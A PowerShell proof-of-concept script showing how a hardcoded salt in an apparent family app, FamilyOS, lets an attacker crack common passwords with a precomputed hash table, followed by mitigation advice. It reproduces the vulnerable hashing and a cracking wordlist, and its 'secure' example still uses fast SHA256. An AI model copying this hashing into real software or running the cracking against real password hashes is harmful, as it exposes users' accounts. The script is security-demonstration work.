#!/usr/bin/env pwsh
<#
.SYNOPSIS
    Proof of Concept - Rainbow Table Attack Against FamilyOS
    
.DESCRIPTION
    Demonstrates how the hardcoded salt vulnerability can be exploited
    to reverse engineer passwords from their hashes.
    
    ⚠️ FOR SECURITY RESEARCH ONLY - DO NOT USE MALICIOUSLY ⚠️
    
.NOTES
    This PoC shows why hardcoded salts are a critical vulnerability
#>

Write-Host "🚨 PROOF OF CONCEPT: Rainbow Table Attack" -ForegroundColor Red -BackgroundColor DarkRed
Write-Host "==========================================" -ForegroundColor Red
Write-Host "⚠️  FOR EDUCATIONAL/SECURITY RESEARCH ONLY" -ForegroundColor Yellow
Write-Host ""

# Simulate the vulnerable password hashing from FamilyOS
function Get-VulnerableHash {
    [CmdletBinding()]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    param(
        # Note: Plain text password parameter is intentional for this PoC demonstration
        [string]$Password
    )
    
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $passwordWithSalt = $Password + "family_salt"
    $hashedBytes = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($passwordWithSalt))
    return [Convert]::ToBase64String($hashedBytes)
}

Write-Host "🔍 STEP 1: Simulating password hash extraction" -ForegroundColor Cyan
Write-Host "An attacker would obtain these hashes from the family data:"

# Simulate common family passwords
$commonPasswords = @("parent123", "kid123", "teen123", "password", "123456", "family", "admin")
$hashedPasswords = @{}

foreach ($password in $commonPasswords) {
    $hash = Get-VulnerableHash $password
    $hashedPasswords[$hash] = $password
    Write-Host "Hash: $hash -> Original: [HIDDEN]" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "🎯 STEP 2: Building rainbow table with known salt" -ForegroundColor Cyan
Write-Host "Since salt is hardcoded as 'family_salt', attacker can precompute hashes..."

# Rainbow table generation simulation
Write-Host "Generating rainbow table for common passwords..." -ForegroundColor Yellow

$rainbowTable = @{}
$wordlist = @(
    "password", "123456", "password123", "admin", "user", "test", "guest",
    "parent", "parent123", "mom", "dad", "family", "child", "kid", "kid123",
    "teen", "teen123", "student", "school", "home", "love", "welcome",
    "qwerty", "abc123", "letmein", "monkey", "dragon", "shadow", "master"
)

foreach ($word in $wordlist) {
    $precomputedHash = Get-VulnerableHash $word
    $rainbowTable[$precomputedHash] = $word
}

Write-Host "Rainbow table built with $($rainbowTable.Count) entries" -ForegroundColor Green

Write-Host ""
Write-Host "⚡ STEP 3: Instant password cracking" -ForegroundColor Cyan
Write-Host "Demonstrating how quickly passwords can be reversed:"

foreach ($hash in $hashedPasswords.Keys) {
    if ($rainbowTable.ContainsKey($hash)) {
        $crackedPassword = $rainbowTable[$hash]
        Write-Host "🔓 CRACKED: $hash -> '$crackedPassword'" -ForegroundColor Red
    } else {
        Write-Host "🔒 Not in rainbow table: $hash" -ForegroundColor Green
    }
}

Write-Host ""
Write-Host "🚨 ATTACK SIMULATION COMPLETE" -ForegroundColor Red
Write-Host "=============================" -ForegroundColor Red
Write-Host ""
Write-Host "💥 IMPACT DEMONSTRATION:" -ForegroundColor Yellow
Write-Host "- ALL family passwords with common patterns can be cracked instantly" -ForegroundColor Red
Write-Host "- No computational effort required beyond hash lookup" -ForegroundColor Red
Write-Host "- Attack scales to millions of passwords with same effort" -ForegroundColor Red
Write-Host ""
Write-Host "🛡️ MITIGATION:" -ForegroundColor Green
Write-Host "- Use unique, cryptographically random salts for each password" -ForegroundColor White
Write-Host "- Store salt separately or append to hash" -ForegroundColor White
Write-Host "- Consider using bcrypt, scrypt, or Argon2 for password hashing" -ForegroundColor White
Write-Host ""
Write-Host "🔐 SECURE IMPLEMENTATION EXAMPLE:" -ForegroundColor Cyan

$secureExample = @"
private string HashPassword(string password) {
    var salt = new byte[32];
    using var rng = RandomNumberGenerator.Create();
    rng.GetBytes(salt);
    
    using var sha256 = SHA256.Create();
    var saltedPassword = Encoding.UTF8.GetBytes(password).Concat(salt).ToArray();
    var hash = sha256.ComputeHash(saltedPassword);
    
    return Convert.ToBase64String(hash) + ":" + Convert.ToBase64String(salt);
}
"@

Write-Host $secureExample -ForegroundColor White
Write-Host ""
Write-Host "⚠️ This vulnerability must be patched immediately!" -ForegroundColor Red -BackgroundColor DarkRed